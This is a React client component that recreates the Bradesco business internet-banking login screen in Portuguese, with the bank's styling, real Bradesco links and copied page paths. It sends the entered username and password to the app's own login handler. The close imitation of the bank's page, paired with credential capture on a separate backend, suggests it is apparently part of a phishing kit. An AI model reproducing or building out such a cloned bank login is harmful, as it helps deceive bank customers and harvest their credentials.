"use client";

import { useIdentification } from "@/contexts/IdentificationContext";
import { useState } from "react";
import { SelectLoginType } from "./SelectLoginType";

interface MainContentLoginS1 {
  error: "none" | "login" | "senha";
}

export function MainContentLoginS1({ error = "none" }: MainContentLoginS1) {
  const { loginS1, loading } = useIdentification();
  const [usuario, setUsuario] = useState("");
  const [senhaUsuario, setSenhaUsuario] = useState("");

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    await loginS1({ usuario, senha: senhaUsuario });
  }

  const showLoginError = error === "login";
  const showSenhaError = error === "senha";

  return (
    <div>
      <form onSubmit={onSubmit} noValidate>
        <div className="border border-[#ccc] border-b-bradesco-dark">
          <div className="bgt"></div>

          <div className="flex">
            <span className="w-[20px] !h-[23.2px] mr-5 overflow-hidden leading-[120%] text-[11px] font-bold bg-bradesco-dark py-[5px] text-center text-white">
              <span className="ml-1px">1</span>
            </span>

            <div className="flex ">
              {/* Selecionar tipo login */}
              <div className="mr-5">
                <div className="pt-[5px] pb-[10px] !mb-[10px]">
                  <b className="text-[15px] text-bradesco-text">
                    Selecione um tipo de acesso
                  </b>
                </div>
                <SelectLoginType />
              </div>

              {/* box login usuario e senha */}
              <div className="flex flex-col ">
                <div
                  className={`bg-[#F3F3F3] border border-[#ccc] py-[13px] px-[15px] w-[232px] ${
                    error !== "none" ? "erroOn txtErro" : ""
                  }`}
                >
                  {error === "login" && (
                    <div className="txtErro mb-2 text-red-600 text-[11px]">
                      <strong>
                        Verifique se seu usuário e senha estão corretos e tente
                        novamente. Se o erro persistir,{" "}
                        <a
                          href="https://banco.bradesco/html/pessoajuridica/regularizacao-de-acesso/lp-02/index.html"
                          target="_blank"
                          className="underline"
                        >
                          confira aqui
                        </a>{" "}
                        como regularizar o acesso.
                      </strong>
                    </div>
                  )}
                  {error === "senha" && (
                    <div className="txtErro mb-2 text-red-600 text-[11px]">
                      <strong>A senha deve ter entre 8 a 20 dígitos.</strong>
                    </div>
                  )}

                  {/* Usuario */}
                  <div className="flex mb-[5px] items-center ">
                    <p className="text-[11px] cursor-pointer w-[44.06px] leading-4  block">
                      Usuário
                    </p>
                    <input
                      name="usuario"
                      type="text"
                      tabIndex={1}
                      className="h-[21px] input_text outline-none flex-1 border px-2"
                      title="Informe o nome do usuário"
                      autoComplete="username"
                      required
                      value={usuario}
                      onChange={(e) => setUsuario(e.target.value)}
                      aria-invalid={showLoginError ? true : undefined}
                    />
                  </div>

                  {/* Senha */}
                  <div className="flex mb-[10px] items-center ">
                    <p className="text-[11px] cursor-pointer w-[44.06px] leading-4  block">
                      Senha
                    </p>
                    <input
                      name="senhaUsuario"
                      type="password"
                      tabIndex={2}
                      maxLength={20}
                      className="h-[21px] input_text outline-none flex-1 border px-2"
                      title="Informe a senha de 8 a 20 dígitos"
                      autoComplete="current-password"
                      required
                      // ajuda de validação no cliente (servidor já valida com zod)
                      pattern=".{8,20}"
                      value={senhaUsuario}
                      onChange={(e) => setSenhaUsuario(e.target.value)}
                      aria-invalid={showSenhaError ? true : undefined}
                    />
                  </div>

                  <div className="float-right text-[11px] pb-[10px]">
                    <a
                      href="https://www.ne12.bradesconetempresa.b.br/ibpjtrocamaster/trocarSenhaMasterInicial.jsf"
                      title="clique aqui"
                    >
                      <span className="hover:text-bradesco-text hover:underline">
                        Esqueci usuário/senha
                      </span>
                    </a>
                  </div>
                </div>

                {/* lembrar acesso */}
                <div className="pt-[5px] h-[20.2px] text-right whitespace-nowrap float-right ">
                  <input type="checkbox" />
                  <span className="whitespace-nowrap text-[11px]">
                    {" "}
                    Lembrar meu acesso
                  </span>
                </div>
              </div>
            </div>
          </div>

          <div className="bgb"></div>
        </div>

        <div>
          <div>
            <div className="mt-[10px]">
              <ul className="btos_bottom">
                <li>
                  <a
                    href="/ibpjlogin/logoff.jsf"
                    title="Cancelar Acesso"
                    className="btnCancelarAcesso mr10 fecharFiltroExtrato tabindex"
                    tabIndex={44}
                  />
                </li>
                <li>
                  <input
                    id="identificationLogin"
                    type="submit"
                    alt="Avançar"
                    title="Avançar"
                    className="bt_avancar botoesLogin block cursor-pointer border px-3 py-1 rounded"
                    tabIndex={20}
                    style={{ display: "block" }}
                    disabled={loading}
                  />
                </li>
              </ul>
            </div>

            <div className="pt-[30px] text-[11px] font-bold">
              Se seu contrato foi feito na agência,{" "}
              <a href="" className="underline hover:text-bradesco-text">
                faça seu primeiro acesso por aqui.
              </a>
            </div>
          </div>
        </div>
      </form>
    </div>
  );
}
